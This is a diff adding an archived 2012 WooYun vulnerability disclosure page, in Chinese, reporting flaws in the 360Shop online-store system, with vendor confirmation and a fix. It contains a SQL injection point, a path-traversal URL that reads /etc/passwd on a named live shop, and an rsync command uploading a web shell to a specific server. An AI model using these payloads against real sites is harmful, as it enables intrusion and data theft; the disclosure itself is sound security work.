@@ -1,0 +1,261 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		360Shop网店系统多个漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		360Shop网店系统多个漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/an1k3r">an1k3r</a> 
+</li><li>提交时间：		2012-08-15 16:08</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-18：	细节向第三方安全合作伙伴开放<br/>
+									2012-08-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-09-04：	细节向普通白帽子公开<br/>
+									2012-09-24：	细节向实习白帽子公开<br/>
+									2012-09-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">360Shop网店系统多个漏洞，部分漏洞可getshell。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">官网：http://www.360shop.com.cn<br />
+<br />
+测试基于360Shop最新版本V3.0<br />
+<br />
+<br />
+<br />
+使用这套系统的有独立的站点，如<br />
+<br />
+http://www.iplaybox.net<br />
+<br />
+http://www.lpxxw.net<br />
+<br />
+也有托管给官方的网店,这个比较多，可能有几千个，如：<br />
+<br />
+http://09pf.taodiantong.com<br />
+<br />
+http://520mpai.taodiantong.com<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+1. SQL注入<br />
+<br />
+测试地址：<br />
+<br />
+http://www.iplaybox.net/?do=display&amp;mod=goods&amp;id=10839<br />
+<br />
+Mysql错显Integer型注入，POST方法。<br />
+<br />
+</p><p class="detail"><a href="../images/22121026934a759324c49d3e558b518d733083c4.png" target="_blank"><img src="../images/22121026934a759324c49d3e558b518d733083c4.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+后台地址：http://www.iplaybox.net/admin/login.php<br />
+<br />
+</p><p class="detail"><a href="../images/221236259e7afa0bad44370ab02ae829dc76149a.png" target="_blank"><img src="../images/221236259e7afa0bad44370ab02ae829dc76149a.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+漏洞参数为xajaxargs<br />
+<br />
+</p><pre><code>function initProcessRequests()<br />
+    {<br />
+        $xajaxRequest = array();<br />
+        $xajaxRequest[&#039;xajaxr&#039;] = @$_GET[&#039;xajaxr&#039;];<br />
+        $xajaxRequest[&#039;xajax&#039;] = @$_GET[&#039;xajax&#039;];<br />
+        // reset RequestMode<br />
+        if(isset($_GET[&#039;xajax&#039;]))<br />
+        {<br />
+            $_GET[&#039;xajax&#039;] = null;<br />
+            unset($_GET[&#039;xajax&#039;]);<br />
+        }<br />
+        // get the upload file local path<br />
+        foreach(array_keys($_FILES) as $name)<br />
+        {<br />
+            if(isset($_GET[$name]) &amp;&amp; !isset($_POST[$name]))<br />
+            {<br />
+                $_POST[$name] = $this-&gt;_decodeUTF8Data($_GET[$name]);<br />
+            }<br />
+        }<br />
+        $xajaxargs = array(get_original_data($_POST));<br />
+        $xajaxRequest[&#039;xajaxargs&#039;] = $xajaxargs;<br />
+        $_POST = $xajaxRequest;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+2. 本地文件包含。<br />
+<br />
+http://www.iplaybox.net/?do=display&amp;id=3653&amp;mod=../../../../../../../../../../etc/passwd%00.jpg<br />
+<br />
+</p><p class="detail"><a href="../images/22121619d444568c14fce143023b0842c2f47963.png" target="_blank"><img src="../images/22121619d444568c14fce143023b0842c2f47963.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+普通用户没有上传点，后台上传的图片也都到了官方提供的服务器上了，漏洞比较鸡肋。<br />
+<br />
+<br />
+<br />
+3. Rsync任意文件上传。<br />
+<br />
+推测一些网店用的是360Shop官方提供的服务器，使用了同样版本的Linux，PHP和Nginx。其中部分服务器的Web目录直接Rsync可写，导致可直接上传Shell。<br />
+<br />
+</p><pre><code>rsync.exe 360shop/shell.php root@121.52.224.82::lsa/admin</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/22122608f2b6f6f166f9b344af86555f39910c77.png" target="_blank"><img src="../images/22122608f2b6f6f166f9b344af86555f39910c77.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上传的shell。</p><p class="detail"><a href="../images/221227046bd1a4db7b3a38ca1b3633dbabc16c11.png" target="_blank"><img src="../images/221227046bd1a4db7b3a38ca1b3633dbabc16c11.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+目前网上貌似没有暴出该网店系统的漏洞，且网店和支付宝有接口，有撞库的可能。请cncert通知官方，依情况看是否要发布此漏洞～ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">在详细说明里了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 过滤。<br />
+<br />
+2. Rsync设置验证。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/an1k3r" title="an1k3r">an1k3r</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010000" title="360Shop网店系统多个漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-08-15 17:50</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">添加对漏洞的补充说明以及做出评价的理由</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-08-17：以上问题已修复，感谢an1k3r的贡献！</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10000";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
